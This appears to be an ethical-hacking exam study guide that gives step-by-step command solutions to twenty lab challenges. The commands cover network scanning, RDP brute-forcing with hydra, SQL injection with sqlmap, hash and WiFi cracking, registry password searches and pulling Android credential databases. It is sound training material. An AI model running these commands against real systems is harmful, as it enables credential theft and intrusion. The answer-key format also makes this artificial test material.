# All 20 Challenge Examples with Solutions

## By Domain

### Domain 1: Network Scanning & Enumeration (Challenges 1-2)

#### Challenge 1: Find Domain Controller DNS Name
**Difficulty:** Easy | **Time:** 10-15 minutes  
**Question:** Conduct a comprehensive scan of the network to identify the DNS computer name of the Domain Controller.  
**Answer Format:** AaaaaAaaa*AAAAAA*aaa (e.g., DOMAINCONTROLLER01)

**Solution:**
1. `nmap -A -T4 192.168.1.0/24`
2. Look for domain controller (port 389/445/3389)
3. `nmap --script smb-os-discovery.nse -p445 [DC_IP]`
4. Extract Computer name field

---

#### Challenge 2: Find IMAP Mercury Service Version
**Difficulty:** Easy | **Time:** 10 minutes  
**Question:** Identify the version of the IMAP Mercury service.  
**Answer Format:** N.NN (e.g., 4.62)

**Solution:**
1. `nmap -A -T4 -p- 192.168.1.0/24`
2. Find port 143 (IMAP)
3. `nmap -sV -p 143 [HOST]`
4. Extract version number

---

### Domain 2: System Hacking & Exploitation (Challenges 5-6)

#### Challenge 5: Crack RDP Credentials
**Difficulty:** Medium | **Time:** 15-20 minutes  
**Question:** Crack the Windows RDP password for user "Admin".  
**Answer Format:** AaaAaa*aaaa

**Solution:**
1. `nmap -p 3389 192.168.1.0/24` (find RDP)
2. `hydra -l Admin -P rockyou.txt rdp://[HOST]:3389 -v`
3. Wait for successful login message
4. Extract password

---

#### Challenge 6: Find Encrypted Password in Registry
**Difficulty:** Medium | **Time:** 15 minutes  
**Question:** Connect via RDP with cracked credentials, find password stored in registry.  
**Answer Format:** AaaaaaAaa*AAA

**Solution:**
1. Use RDP client: `xfreerdp /u:Admin /p:PASSWORD /v:192.168.1.50`
2. Open Command Prompt
3. `reg query HKLM\Software\Microsoft\Windows /s | findstr /i password`
4. Extract found password

---

### Domain 3: Web Server & Application Hacking (Challenges 3, 16)

#### Challenge 3: SQL Injection - Extract Database
**Difficulty:** Medium | **Time:** 15-20 minutes  
**Question:** Use SQL injection to extract data from victim database.  
**Answer Format:** NaaAaa*aaa*aaaaa

**Solution:**
1. `sqlmap -u "http://192.168.1.5/page.php?id=1" -v`
2. `sqlmap -u "http://192.168.1.5/page.php?id=1" --dbs`
3. `sqlmap -u "http://192.168.1.5/page.php?id=1" -D dbname --tables`
4. `sqlmap -u "http://192.168.1.5/page.php?id=1" -D dbname -T users --dump`
5. Extract answer from output

---

#### Challenge 16: Path Traversal / Directory Enumeration
**Difficulty:** Medium | **Time:** 15 minutes  
**Question:** Find hidden admin directory on web server.  
**Answer Format:** /admin*area

**Solution:**
1. `nikto -h http://192.168.1.50`
2. Or: `robuster dir -u http://192.168.1.50 -w /usr/share/wordlists/dirb/common.txt`
3. Look for 200 responses (found directories)
4. Test found directories in browser
5. Find admin-related directory

---

### Domain 4: Cryptography & Steganography (Challenges 8, 9, 11)

#### Challenge 8: Hash Cracking
**Difficulty:** Easy | **Time:** 10 minutes  
**Question:** Crack the MD5 hash to find the password.  
**Answer Format:** AaaAaa*Aaaa

**Solution:**
1. `hashid hash_value`
2. `hashcat -m 0 -a 0 hashfile rockyou.txt`
3. Wait for match
4. Extract password

---

#### Challenge 9: PE File Version Extraction
**Difficulty:** Medium | **Time:** 15 minutes  
**Question:** Find the File Version number from Ghostware.exe.  
**Answer Format:** N.N.N.N (e.g., 2.3.4.5)

**Solution:**
1. Launch DIE application
2. File → Open → Ghostware.exe
3. Click "File Info" in right pane
4. Look for "Version" or "FileVersion" field
5. Extract version number

---

#### Challenge 11: Steganography Extraction
**Difficulty:** Medium | **Time:** 10-15 minutes  
**Question:** Extract hidden data from image file.  
**Answer Format:** AaaAaa*Aaaa

**Solution:**
1. `steghide info image.jpg`
2. `steghide extract -sf image.jpg -p ""`
3. `cat secret.txt`
4. Extract hidden message

---

### Domain 5: Mobile & IoT Security (Challenges 4, 7)

#### Challenge 4: Android Steganography
**Difficulty:** Medium | **Time:** 15-20 minutes  
**Question:** Extract the hidden data from IMG_20240621_143000.jpg on Android device.  
**Answer Format:** Variable (depends on hidden content)

**Solution:**
1. `adb connect 192.168.1.100:5555`
2. `adb shell ls /sdcard/DCIM/Camera/`
3. `adb pull /sdcard/DCIM/Camera/IMG_20240621_143000.jpg ./`
4. `steghide extract -sf IMG_20240621_143000.jpg -p ""`
5. `cat secret.txt`
6. Extract hidden data

---

#### Challenge 7: Advanced ADB Workflows
**Difficulty:** Medium | **Time:** 20 minutes  
**Question:** Find database with login credentials on Android device.  
**Answer Format:** Variable (credentials from database)

**Solution:**
1. `adb root`
2. `adb shell ls /data/data/ | grep -i app_name`
3. `adb pull /data/data/com.example.banking/databases/users.db ./`
4. `sqlite3 users.db`
5. `.tables`
6. `SELECT * FROM users;`
7. Extract credentials

---

### Domain 6: Traffic Analysis & Sniffing (Challenges 10, 12, 18, 19)

#### Challenge 10: RAT Detection in PCAP
**Difficulty:** Hard | **Time:** 20-25 minutes  
**Question:** Analyze traffic to identify RAT activity and extract attacker details.  
**Answer Format:** Variable (IP, port, commands)

**Solution:**
1. Open PCAP in Wireshark
2. Look for unusual outbound connections
3. Filter: `ip.src == 192.168.1.50 && tcp.dstport != 80,443,53`
4. Right-click → Follow TCP Stream
5. Identify attacker IP, port, and commands
6. Extract findings

---

#### Challenge 12: DDoS Attack - Identify Attacker
**Difficulty:** Medium | **Time:** 15 minutes  
**Question:** Analyze traffic targeting 172.22.10.10, identify Windows attacker IP and OS.  
**Answer Format:** NN.NN.NN.NN

**Solution:**
1. Open PCAP in Wireshark
2. Filter: `ip.dst == 172.22.10.10`
3. Statistics → Endpoints
4. Find IP with highest packet count
5. Check TTL values (128 = Windows)
6. Extract attacker IP

---

#### Challenge 18: IoT Protocol - MQTT Topic Extraction
**Difficulty:** Medium | **Time:** 15 minutes  
**Question:** Find IoT Publish Message in traffic, extract topic name.  
**Answer Format:** Aaaa*Aaaa (e.g., home/temperature)

**Solution:**
1. Open PCAP in Wireshark
2. Filter: `mqtt.msgtype == 3`
3. Look for PUBLISH packets
4. Expand MQTT section in packet details
5. Find "Topic Name" field
6. Extract exact topic name

---

#### Challenge 19: Advanced Traffic Analysis
**Difficulty:** Hard | **Time:** 20-25 minutes  
**Question:** Identify data exfiltration in traffic - extract stolen files/credentials.  
**Answer Format:** Variable

**Solution:**
1. Open PCAP in Wireshark
2. Look for large outbound transfers
3. Filter: `ip.src == [internal_ip] && ip.dst != [internal_network]`
4. Identify protocol (FTP, SMB, HTTP)
5. Extract file contents or credentials
6. Follow TCP Stream for complete data

---

### Domain 7: Wireless Network Cracking (Challenge 20)

#### Challenge 20: WiFi Cracking - Extract Last 4 Characters
**Difficulty:** Easy | **Time:** 10-15 minutes  
**Question:** Crack WiFi password from Credmapwifi.cap file, provide last 4 characters.  
**Answer Format:** aaaN (e.g., pass1)

**Solution:**
1. `aircrack-ng Credmapwifi.cap`
2. Find BSSID: `AA:BB:CC:DD:EE:FF`
3. `aircrack-ng -w /usr/share/wordlists/rockyou.txt -b AA:BB:CC:DD:EE:FF Credmapwifi.cap`
4. Shows: `KEY FOUND! [ PasswordHere ]`
5. Extract last 4 characters

---

## Difficulty Summary

| Difficulty | Challenges | Total Time |
|-----------|-----------|-----------|
| **Easy** (8-10 min) | 1, 2, 8, 20 | 40 minutes |
| **Medium** (15-20 min) | 5, 6, 3, 16, 9, 11, 4, 7, 12, 18 | 170 minutes |
| **Hard** (20-30 min) | 10, 19 | 50 minutes |

---

## Challenge Clusters by Domain

```
DOMAIN 1: Network Scanning
├── Challenge 1: DC DNS name (10-15 min)
└── Challenge 2: IMAP version (10 min)

DOMAIN 2: System Hacking
├── Challenge 5: RDP cracking (15-20 min)
└── Challenge 6: Registry password (15 min)

DOMAIN 3: Web Hacking
├── Challenge 3: SQL injection (15-20 min)
└── Challenge 16: Directory enum (15 min)

DOMAIN 4: Cryptography
├── Challenge 8: Hash cracking (10 min)
├── Challenge 9: PE version (15 min)
└── Challenge 11: Steganography (10-15 min)

DOMAIN 5: Mobile/IoT
├── Challenge 4: Android steganography (15-20 min)
└── Challenge 7: ADB database (20 min)

DOMAIN 6: Traffic Analysis
├── Challenge 10: RAT detection (20-25 min)
├── Challenge 12: DDoS analysis (15 min)
├── Challenge 18: MQTT topics (15 min)
└── Challenge 19: Data exfiltration (20-25 min)

DOMAIN 7: Wireless
└── Challenge 20: WiFi cracking (10-15 min)
```

---

## Time Management Strategy

1. **Start with Easy challenges** (1, 2, 8, 20) - Quick points
2. **Do Medium challenges** (5, 6, 3, 16, 9, 11, 4, 7, 12, 18) - Most time
3. **Save Hard for last** (10, 19) - If time permits

**Total exam: 6 hours = 360 minutes**
- Recommended: 14 of 20 challenges (70% = passing)
- Easy: 4 challenges = 40 min
- Medium: 10 challenges = 170 min
- Total: 210 minutes, leaving 150 min buffer for errors/rechecks

---

**See individual domain folders for detailed challenge solutions:**
- [Domain 1 Challenges](../domain-1-network-scanning/challenges.html)
- [Domain 2 Challenges](../domain-2-system-hacking/challenges.html)
- [Domain 3 Challenges](../domain-3-web-hacking/challenges.html)
- [Domain 4 Challenges](../domain-4-cryptography/challenges.html)
- [Domain 5 Challenges](../domain-5-mobile-iot/challenges.html)
- [Domain 6 Challenges](../domain-6-traffic-analysis/challenges.html)
- [Domain 7 Challenges](../domain-7-wireless/challenges.html)
